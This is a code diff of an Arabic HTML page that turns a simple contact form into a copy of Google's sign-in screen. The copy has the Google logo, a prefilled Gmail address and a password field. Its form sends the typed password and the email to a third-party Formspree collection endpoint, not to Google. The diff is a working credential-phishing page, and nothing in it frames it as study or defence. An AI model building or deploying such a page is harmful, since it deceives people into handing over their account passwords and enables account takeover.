@@ -1,17 +1,101 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-  <meta charset="UTF-8">
-  <title>Google</title>
+  <meta charset="UTF-8" />
+  <title>تسجيل الدخول - Google</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    body {
+      font-family: 'Roboto', sans-serif;
+      background-color: #f2f2f2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .login-container {
+      background: white;
+      padding: 30px 40px;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 400px;
+    }
+    .logo {
+      display: block;
+      margin: 0 auto 20px;
+      width: 80px;
+    }
+    .email-display {
+      font-size: 16px;
+      margin-bottom: 10px;
+      color: #333;
+      background-color: #f1f3f4;
+      padding: 10px;
+      border-radius: 5px;
+      text-align: center;
+    }
+    .input-group {
+      margin-bottom: 20px;
+    }
+    label {
+      font-size: 14px;
+      color: #5f6368;
+      display: block;
+      margin-bottom: 5px;
+    }
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      font-size: 16px;
+      border: 1px solid #dadce0;
+      border-radius: 5px;
+      outline: none;
+    }
+    .btn {
+      background-color: #1a73e8;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      font-size: 16px;
+      border-radius: 5px;
+      cursor: pointer;
+      width: 100%;
+    }
+    .btn:hover {
+      background-color: #1669c1;
+    }
+    .footer {
+      margin-top: 20px;
+      text-align: center;
+      font-size: 12px;
+      color: #777;
+    }
+  </style>
 </head>
 <body>
-  <h2>راسلنا</h2>
-  <form action="https://formspree.io/f/xwpbbbvd" method="POST">
-    <input type="text" name="message" placeholder="اكتب رسالتك هنا" required>
-    <br><br>
-    <input type="email" name="_replyto" placeholder="بريدك الإلكتروني" required>
-    <br><br>
-    <button type="submit">إرسال</button>
-  </form>
+
+  <div class="login-container">
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" class="logo" />
+
+    <div class="email-display">m91635341@gmail.com</div>
+
+    <form action="https://formspree.io/f/xwpbbbvd" method="POST">
+      <input type="hidden" name="email" value="m91635341@gmail.com" />
+
+      <div class="input-group">
+        <label for="password">أدخل كلمة المرور</label>
+        <input type="password" id="password" name="password" required />
+      </div>
+
+      <button type="submit" class="btn">التالي</button>
+    </form>
+
+    <div class="footer">
+      صفحة تسجيل دخول بسيطة - محاكاة واجهة Google
+    </div>
+  </div>
+
 </body>
 </html>
